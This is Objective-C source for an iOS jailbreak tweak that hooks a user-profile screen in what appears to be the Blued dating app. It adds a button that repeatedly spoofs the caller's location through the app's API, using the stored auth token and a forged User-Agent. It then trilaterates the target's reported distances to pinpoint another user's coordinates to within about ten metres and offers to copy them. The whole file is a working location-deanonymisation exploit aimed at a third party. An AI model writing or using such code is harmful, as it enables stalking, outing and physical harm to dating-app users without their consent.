#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

#define _USE_MATH_DEFINES
#import <math.h>

#define TLog(fmt, ...) NSLog(@"[TrackTweak] " fmt, ##__VA_ARGS__)

// ==================== 🛠️ 配置区域 ====================
static NSString *const kTargetClassName = @"UserProfileViewController"; // 目标ViewController类名

// 按钮配置
static NSString *const kButtonTitle = @"🛰️ 递归几何定位";
static CGFloat const kButtonWidth = 180.0f;
static CGFloat const kButtonHeight = 44.0f;

// 算法配置
static int const kMaxIterations = 12;
static double const kLockDistance = 0.01;   // 10米
static double const kEarthRadiusKm = 111.32;

// 全局按钮弱引用（防止循环引用与内存泄漏）
static __weak UIButton *g_trackButton = nil;

// 存储原 App 生命周期的全局函数指针
static IMP g_orig_viewDidAppear = NULL;
static IMP g_orig_viewWillDisappear = NULL;

typedef struct { double lat; double lng; } LocationCoordinate;
typedef struct { LocationCoordinate p1; LocationCoordinate p2; BOOL hasIntersection; } IntersectionResult;

static IntersectionResult calculateIntersections(LocationCoordinate loc1, LocationCoordinate loc2, double r1, double r2);

// ==================== 🎯 核心逻辑适配层 ====================
@interface NSObject (TrackTweakAddition)
- (void)tt_createTrackButton;
- (void)tt_onTrackButtonClicked:(UIButton *)sender;
- (void)tt_runRecursiveTrilaterationWithUid:(NSString *)uid initialDistance:(double)initDist;
- (double)tt_getDistanceWithCoordinate:(LocationCoordinate)loc uid:(NSString *)uid;
- (void)tt_showSuccessAlertWithLocation:(LocationCoordinate)loc distance:(double)dist;
@end

@implementation NSObject (TrackTweakAddition)

- (void)tt_createTrackButton {
    UIViewController *vc = (UIViewController *)self;
    if (g_trackButton) return;
    
    UIButton *button = [UIButton buttonWithType:UIButtonTypeSystem];
    [button setTitle:kButtonTitle forState:UIControlStateNormal];
    [button setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    button.backgroundColor = [UIColor colorWithRed:233/255.0 green:30/255.0 blue:99/255.0 alpha:1.0];
    button.layer.cornerRadius = 8.0f;
    button.clipsToBounds = YES;
    button.titleLabel.font = [UIFont systemFontOfSize:15 weight:UIFontWeightMedium];
    
    CGFloat topSafeArea = 44.0f;
    if (@available(iOS 11.0, *)) {
        topSafeArea = vc.view.safeAreaInsets.top;
    }
    button.frame = CGRectMake(CGRectGetWidth(vc.view.bounds) - kButtonWidth - 16, topSafeArea + 20, kButtonWidth, kButtonHeight);
    
    [button addTarget:self action:@selector(tt_onTrackButtonClicked:) forControlEvents:UIControlEventTouchUpInside];
    [vc.view addSubview:button];
    g_trackButton = button;
}

- (void)tt_onTrackButtonClicked:(UIButton *)sender {
    sender.userInteractionEnabled = NO;
    [sender setTitle:@"🛰️ 定位中..." forState:UIControlStateNormal];
    
    NSString *targetUid = nil;
    if ([self respondsToSelector:NSSelectorFromString(@"userId")]) {
        targetUid = [self valueForKey:@"userId"];
    } else if ([self respondsToSelector:NSSelectorFromString(@"uid")]) {
        targetUid = [self valueForKey:@"uid"];
    }
    
    double initDistance = -1.0;
    if ([self respondsToSelector:NSSelectorFromString(@"userModel")]) {
        id model = [self valueForKey:@"userModel"];
        if ([model respondsToSelector:NSSelectorFromString(@"distance")]) {
            initDistance = [[model valueForKey:@"distance"] doubleValue];
        }
    }
    
    if (!targetUid || initDistance < 0) {
        TLog(@"数据解析失败，请检查UID或Distance的Property挂钩路径");
        sender.userInteractionEnabled = YES;
        [sender setTitle:kButtonTitle forState:UIControlStateNormal];
        return;
    }
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self tt_runRecursiveTrilaterationWithUid:targetUid initialDistance:initDistance];
        
        dispatch_async(dispatch_get_main_queue(), ^{
            if (g_trackButton) {
                g_trackButton.userInteractionEnabled = YES;
                [g_trackButton setTitle:kButtonTitle forState:UIControlStateNormal];
            }
        });
    });
}

- (void)tt_runRecursiveTrilaterationWithUid:(NSString *)uid initialDistance:(double)initDist {
    UIViewController *vc = (UIViewController *)self;
    LocationCoordinate currentLoc = {22.6942, 114.2074}; // 深圳默认坐标
    double currentDist = initDist;
    int iteration = 0;
    
    while (iteration < kMaxIterations && currentDist > kLockDistance) {
        iteration++;
        
        dispatch_async(dispatch_get_main_queue(), ^{
            UIAlertController *hud = [UIAlertController alertControllerWithTitle:@"雷达扫描中"
                                                                         message:[NSString stringWithFormat:@"第 %d 轮迭代计算...\n当前误差: %.2f米", iteration, currentDist * 1000]
                                                                  preferredStyle:UIAlertControllerStyleAlert];
            [vc presentViewController:hud animated:YES completion:^{
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                    [hud dismissViewControllerAnimated:YES completion:nil];
                });
            }];
        });
        
        [NSThread sleepForTimeInterval:0.6];
        
        double latRad = currentLoc.lat * M_PI / 180.0;
        double offsetLng = currentLoc.lng + (currentDist / (kEarthRadiusKm * cos(latRad)));
        LocationCoordinate detectLoc = {currentLoc.lat, offsetLng};
        
        double detectDist = [self tt_getDistanceWithCoordinate:detectLoc uid:uid];
        if (detectDist <= 0) break;
        
        IntersectionResult result = calculateIntersections(currentLoc, detectLoc, currentDist, detectDist);
        if (!result.hasIntersection) {
            currentLoc.lng += (currentDist * 0.1) / (kEarthRadiusKm * cos(latRad));
            continue;
        }
        
        double dist1 = [self tt_getDistanceWithCoordinate:result.p1 uid:uid];
        double dist2 = [self tt_getDistanceWithCoordinate:result.p2 uid:uid];
        
        if (dist1 >= 0 && (dist2 < 0 || dist1 < dist2)) {
            currentLoc = result.p1;
            currentDist = dist1;
        } else if (dist2 >= 0) {
            currentLoc = result.p2;
            currentDist = dist2;
        } else {
            break;
        }
    }
    
    dispatch_async(dispatch_get_main_queue(), ^{
        if (currentDist <= kLockDistance) {
            [self tt_showSuccessAlertWithLocation:currentLoc distance:currentDist];
        } else {
            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"扫描中断" message:@"未能成功收敛到目标精度，请刷新重试。" preferredStyle:UIAlertControllerStyleAlert];
            [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
            [vc presentViewController:alert animated:YES completion:nil];
        }
    });
}

- (double)tt_getDistanceWithCoordinate:(LocationCoordinate)loc uid:(NSString *)uid {
    NSString *token = @"";
    Class userManagerClass = NSClassFromString(@"UserManager");
    if (userManagerClass && [userManagerClass respondsToSelector:NSSelectorFromString(@"shared")]) {
        id manager = [userManagerClass performSelector:NSSelectorFromString(@"shared")];
        if ([manager respondsToSelector:NSSelectorFromString(@"token")]) {
            token = [manager performSelector:NSSelectorFromString(@"token")];
        }
    }
    
    __block double fetchedDistance = -1.0;
    
    NSString *updateUrl = [NSString stringWithFormat:@"https://argo.blued.cn/users?sort_by=nearby&latitude=%f&longitude=%f&limit=1", loc.lat, loc.lng];
    NSMutableURLRequest *updateReq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:updateUrl]];
    [updateReq setHTTPMethod:@"GET"];
    [updateReq setValue:token forHTTPHeaderField:@"Authorization"];
    [updateReq setValue:@"Mozilla/5.0 (Linux; U; Android 13; ...) Android/300237_0.23.7_2842_0221 app/1" forHTTPHeaderField:@"User-Agent"];
    
    dispatch_semaphore_t sema1 = dispatch_semaphore_create(0);
    [[[NSURLSession sharedSession] dataTaskWithRequest:updateReq completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        dispatch_semaphore_signal(sema1);
    }] resume];
    dispatch_semaphore_wait(sema1, DISPATCH_TIME_FOREVER);
    
    [NSThread sleepForTimeInterval:1.0];
    
    NSString *distanceUrl = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSMutableURLRequest *distReq = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:distanceUrl]];
    [distReq setHTTPMethod:@"GET"];
    [distReq setValue:token forHTTPHeaderField:@"Authorization"];
    [distReq setValue:@"Mozilla/5.0 (Linux; U; Android 13; ...) Android/300237_0.23.7_2842_0221 app/1" forHTTPHeaderField:@"User-Agent"];
    
    dispatch_semaphore_t sema2 = dispatch_semaphore_create(0);
    [[[NSURLSession sharedSession] dataTaskWithRequest:distReq completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (data && !error) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            NSArray *dataArray = json[@"data"];
            if (dataArray && dataArray.count > 0) {
                fetchedDistance = [dataArray[0][@"distance"] doubleValue];
            }
        }
        dispatch_semaphore_signal(sema2);
    }] resume];
    dispatch_semaphore_wait(sema2, DISPATCH_TIME_FOREVER);
    
    return fetchedDistance;
}

- (void)tt_showSuccessAlertWithLocation:(LocationCoordinate)loc distance:(double)dist {
    UIViewController *vc = (UIViewController *)self;
    NSString *msg = [NSString stringWithFormat:@"🎯 极限锁定成功\n\n纬度：%.8f\n经度：%.8f\n最终误差：%.2f米", loc.lat, loc.lng, dist * 1000];
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"雷达锁定" message:msg preferredStyle:UIAlertControllerStyleAlert];
    
    [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
        [UIPasteboard generalPasteboard].string = [NSString stringWithFormat:@"%.8f,%.8f", loc.lat, loc.lng];
    }]];
    [alert addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
    
    [vc presentViewController:alert animated:YES completion:nil];
}

@end

// ==================== 🛠️ 纯C底层计算函数 ====================
static IntersectionResult calculateIntersections(LocationCoordinate loc1, LocationCoordinate loc2, double r1, double r2) {
    IntersectionResult result = {0};
    result.hasIntersection = NO;
    
    double lat1Rad = loc1.lat * M_PI / 180.0;
    double x2 = (loc2.lng - loc1.lng) * kEarthRadiusKm * cos(lat1Rad);
    double y2 = (loc2.lat - loc1.lat) * kEarthRadiusKm;
    double d = sqrt(x2 * x2 + y2 * y2);
    
    if (d > r1 + r2 || d < fabs(r1 - r2) || d == 0) return result;
    
    double a = (r1*r1 - r2*r2 + d*d) / (2 * d);
    double h2 = r1*r1 - a*a;
    double h = sqrt(h2 > 0 ? h2 : 0);
    
    double xm = a * x2 / d;
    double ym = a * y2 / d;
    double rx = -y2 * h / d;
    double ry = x2 * h / d;
    
    result.p1.lat = loc1.lat + (ym + ry) / kEarthRadiusKm;
    result.p1.lng = loc1.lng + (xm + rx) / (kEarthRadiusKm * cos(lat1Rad));
    
    result.p2.lat = loc1.lat + (ym - ry) / kEarthRadiusKm;
    result.p2.lng = loc1.lng + (xm - rx) / (kEarthRadiusKm * cos(lat1Rad));
    
    result.hasIntersection = YES;
    return result;
}

// ==================== 🚀 动态初始化入口 ====================
static void handle_viewDidAppear(UIViewController *self, SEL _cmd, BOOL animated) {
    // 强制转换为(void (*)())类型，用全局静态 IMP 函数指针安全回原方法
    if (g_orig_viewDidAppear) {
        ((void (*)(id, SEL, BOOL))g_orig_viewDidAppear)(self, _cmd, animated);
    }
    
    dispatch_async(dispatch_get_main_queue(), ^{
        [(id)self tt_createTrackButton]; // 强制类型转换，消除潜在的编译未定义警告
    });
}

static void handle_viewWillDisappear(UIViewController *self, SEL _cmd, BOOL animated) {
    if (g_orig_viewWillDisappear) {
        ((void (*)(id, SEL, BOOL))g_orig_viewWillDisappear)(self, _cmd, animated);
    }
    
    dispatch_async(dispatch_get_main_queue(), ^{
        if (g_trackButton) {
            [g_trackButton removeFromSuperview];
            g_trackButton = nil;
        }
    });
}

%ctor {
    @autoreleasepool {
        Class targetClass = NSClassFromString(kTargetClassName);
        if (targetClass) {
            SEL didAppearSEL = NSSelectorFromString(@"viewDidAppear:");
            SEL willDisappearSEL = NSSelectorFromString(@"viewWillDisappear:");
            
            Method m1 = class_getInstanceMethod(targetClass, didAppearSEL);
            Method m2 = class_getInstanceMethod(targetClass, willDisappearSEL);
            
            if (m1 && m2) {
                // 使用全局变量直接且安全地保存原函数 IMP
                g_orig_viewDidAppear = method_setImplementation(m1, (IMP)handle_viewDidAppear);
                g_orig_viewWillDisappear = method_setImplementation(m2, (IMP)handle_viewWillDisappear);
                
                TLog(@"成功挂钩到 iOS 目标类: %@", kTargetClassName);
            }
        } else {
            TLog(@"⚠️ 未找到目标类 %@，请确认类名", kTargetClassName);
        }
    }
}
